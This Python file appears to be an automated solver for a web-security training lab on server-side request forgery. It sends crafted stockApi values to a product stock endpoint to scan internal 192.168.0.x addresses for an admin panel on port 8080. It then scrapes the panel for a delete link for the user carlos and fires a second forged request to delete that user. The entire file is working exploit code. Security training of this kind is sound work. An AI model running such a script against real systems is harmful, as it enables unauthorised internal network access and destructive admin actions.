from ..utils import *
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/product/stock"
    data = "{'stockApi': 'http://192.168.0.\033[1;93m?\033[00m:8080/admin'}"

    print_info(
        f'Scanning the internal network by sending POST requests to "{path}" with the following data:'
    )
    print(f"{data}")

    for i in range(1, 255):
        internal_url = f"http://192.168.0.{i}:8080/admin"
        data = {"stockApi": internal_url}
        resp = session.post_path(path, data=data)

        if resp.status_code != 200:
            print_info_secondary(f"{i} => {resp.status_code}", end="")
        else:
            print_success(f"{i} => 200\n")
            break
    else:
        print_fail("Unable to find an admin interface on port 8080.")

    print_info("Using latest response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        print_fail("Unable to find URL.")
    else:
        ssrf = tag.get("href")[1:]
        print_success(f"Found URL: {ssrf}\n")

    data = {"stockApi": ssrf}
    print_info(
        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    try:
        resp = session.post_path(path, data=data)
        print_success("POST request sent successfully.\n")
    except requests.exceptions.ConnectionError:
        print_info("requests.exceptions.ConnectionError\n")
